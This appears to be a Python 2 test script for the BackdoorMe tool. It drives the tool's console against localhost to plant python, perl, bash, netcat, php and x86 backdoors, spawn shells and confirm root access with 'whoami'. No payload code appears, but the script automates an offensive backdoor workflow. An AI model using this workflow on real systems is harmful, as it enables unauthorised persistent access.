from master import *
#from nose.tools import nottest
import pexpect
import random

def testAddTarget():
    child = pexpect.spawn('python master.py')
    child.expect('Welcome to BackdoorMe')
    child.sendline('addtarget')
    child.expect('Target Hostname:')
    child.sendline('127.0.0.1')
    child.expect('Username:')
    child.sendline('george')
    child.expect('Password:')
    child.sendline("password")
    child.expect('Target')
    child.sendline('open')
    child.expect('Connection established.')
    return child

def testPyth():
	child = testAddTarget()
	child.sendline('use shell/pyth')
	child.expect('Using Python module...')
	port = random.randrange(1024, 65535, 1)
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('Python backdoor on')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('root')
	print "weve got rood"

def testPerl():
	child = testAddTarget()
	child.sendline('use shell/perl')
	child.expect('Using Perl module...')
	#port = random.randrange(1024, 65535, 1)
	port = 53921
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('Perl backdoor on')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('root')
	print "weve got rood"

def testBash():
	child = testAddTarget()
	child.sendline('use shell/bash')
	child.expect('Using Bash backdoor...')
	port = random.randrange(1024, 65535, 1)
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('Bash Backdoor on')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('root')
	print "weve got rood"

def testBash2():
	child = testAddTarget()
	child.sendline('use shell/bash2')
	child.expect('Using second Bash module...')
	port = random.randrange(1024, 65535, 1)
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('Initializing backdoor...')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('root')
	print "weve got rood"

def testx86():
	child = testAddTarget()
	child.sendline('use shell/x86')
	child.expect('Using x86 module...')
	port = random.randrange(1024, 65535, 1)
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('x86 backdoor on')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('root')
	print "weve got rood"

def testNc():
	child = testAddTarget()
	child.sendline('use shell/netcat')
	child.expect('Using netcat backdoor...')
	port = random.randrange(1024, 65535, 1)
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('Netcat backdoor on')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('george')
	print "weve got rood"

def testPHP():
	child = testAddTarget()
	child.sendline('use shell/php')
	child.expect('Using php module...')
	port = random.randrange(1024, 65535, 1)
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('Initializing backdoor...')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('root')
	print "weve got rood"

print "pyth"
testPyth()
print "netcat"
testNc()
print "bash"
testBash()
print "bash2"
testBash2()
print "php"
testPHP()
print "x86"
testx86()
print "perl"
testPerl()
